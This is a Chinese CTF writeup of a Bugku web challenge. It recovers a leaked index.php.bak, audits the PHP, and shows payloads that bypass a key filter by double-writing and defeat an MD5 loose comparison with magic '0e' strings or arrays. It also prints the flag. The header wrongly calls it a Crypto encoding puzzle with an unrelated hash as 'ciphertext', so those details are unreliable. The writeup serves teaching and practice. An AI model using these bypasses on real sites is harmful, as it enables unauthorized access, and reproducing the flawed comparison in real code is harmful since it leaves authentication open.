---
title: 【Bugku CTF Writeup】Crypto-核心价值观编码 (Core Values Encoding)
date: 2026-09-16 10:00:00 +0800
tags:
  - CTF
  - Bugku
  - Writeup
  - Crypto
categories:
  - 网络安全
---

## 一、题目信息

- **题目名称**：备份是个好习惯
- **靶场来源**：Bugku CTF
- **考察知识点**：对程序的理解

## 二、题目密文

```text
d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
结合题目名称“备份是个好习惯”，推测网站可能存在备份文件泄露。

三、解题过程
1. 寻找备份文件
常见的备份文件后缀有 .bak、.swp 等。尝试访问：

text
http://<靶场地址>/index.php.bak
成功下载到一个 PHP 源码文件：

php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
 */

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str, 1);
$str = str_replace('key', '', $str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
2. 代码审计
include_once "flag.php"：引入了包含 flag 的文件

str_replace('key','',$str)：会将 URL 参数中的 key 字符串删除 

parse_str($str)：将处理后的字符串解析成 PHP 变量 

if(md5($key1) == md5($key2) && $key1 !== $key2)：核心判断逻辑，要求两个变量本身不相等，但它们的 MD5 值相等

3. 绕过思路
（1）绕过 key 过滤

因为 str_replace 会把 key 删掉，所以不能直接传 key1=xxx。采用双写绕过：将 key 写成 kkeyey，经过替换后正好剩下 key 。

（2）绕过 MD5 弱比较

在 PHP 中，== 是弱类型比较。如果两个字符串的 MD5 值都以 0e 开头且后面全是数字，PHP 会将其解析为科学计数法，即 0 * 10^n = 0，因此判定为相等 。

常用的 MD5 碰撞字符串对 ：

字符串	MD5 值
QNKCDZO	0e830400451993494058024219903391
240610708	0e462097431906509019562988736854
s878926199a	0e545993274517709034328855841020
s155964671a	0e342768416822451524974117254469
（3）构造 Payload

text
http://<靶场地址>/?kkeyey1=QNKCDZO&kkeyey2=240610708
或者使用数组绕过（md5() 处理数组时返回 NULL）：

text
http://<靶场地址>/?kkeyey1[]=1&kkeyey2[]=2
4. 获取 Flag
访问上述构造的 URL，页面会输出 flag。

四、最终答案
text
flag{30dc9a980306fc42b9603c068a709545}
五、知识点总结
备份文件泄露：.bak 是常见的源码备份后缀，CTF 中常用 dirsearch、SourceLeakHacker 等工具扫描发现 

str_replace 双写绕过：过滤 key 时可以通过 kkeyey 进行绕过 

PHP 弱类型比较：== 在比较 MD5 值时会触发类型转换，0e 开头的哈希值会被当成 0 

MD5 数组绕过：md5() 无法处理数组，传入数组时返回 NULL，NULL == NULL 成立 

安全编码建议：哈希比较应使用 === 或 hash_equals() 避免类型转换问题 
